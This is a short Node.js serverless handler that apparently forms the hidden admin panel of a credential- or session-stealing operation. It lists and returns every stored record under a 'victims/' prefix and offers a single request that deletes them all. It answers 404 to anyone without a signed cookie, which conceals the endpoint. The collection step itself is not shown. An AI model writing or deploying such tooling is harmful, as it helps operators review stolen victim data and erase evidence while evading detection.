const crypto = require('crypto');
const { list, del, get } = require('@vercel/blob');

module.exports = async function handler(req, res) {
  const adminPass = process.env.ADMIN_PASSWORD;
  if (!adminPass) {
    return res.status(404).end();
  }
  if (!verify(req, adminPass)) {
    return res.status(404).end();
  }

  if (req.method === 'GET') {
    let blobs = [];
    try {
      let cursor;
      do {
        const r = await list({ prefix: 'victims/', cursor });
        blobs = blobs.concat(r.blobs || []);
        cursor = r.cursor;
      } while (cursor);
    } catch (e) {
      console.error('DV_LIST_ERR', e && (e.stack || e.message || e));
      blobs = [];
    }

    const sessions = [];
    for (const b of blobs) {
      try {
        const r = await get(b.pathname, { access: 'private', useCache: false });
        if (!r) continue;
        const text = await new Response(r.stream).text();
        sessions.push(JSON.parse(text));
      } catch (e) {
        console.error('DV_GET_ERR', b.pathname, e && (e.message || e));
      }
    }
    sessions.sort((a, b) => String(b.ts || b.t || '').localeCompare(String(a.ts || a.t || '')));
    return res.status(200).json({ sessions: sessions, count: sessions.length });
  }

  if (req.method === 'POST') {
    const body = req.body || {};
    if (body.f === 1) {
      try {
        let cursor;
        const paths = [];
        do {
          const r = await list({ prefix: 'victims/', cursor });
          (r.blobs || []).forEach(b => paths.push(b.pathname));
          cursor = r.cursor;
        } while (cursor);
        if (paths.length) await del(paths);
      } catch (e) {}
      return res.status(200).json({ ok: 1 });
    }
    return res.status(404).end();
  }

  return res.status(404).end();
};

function verify(req, secret) {
  const c = req.headers.cookie || '';
  const m = c.match(/(?:^|;\s*)dxy_s=(\d{10,13})\.([a-f0-9]{64})/);
  if (!m) return false;
  const exp = Number(m[1]);
  if (!exp || exp * 1000 < Date.now()) return false;
  const expect = crypto.createHmac('sha256', secret).update(String(exp)).digest('hex');
  try {
    return crypto.timingSafeEqual(Buffer.from(m[2], 'hex'), Buffer.from(expect, 'hex'));
  } catch (e) {
    return false;
  }
}
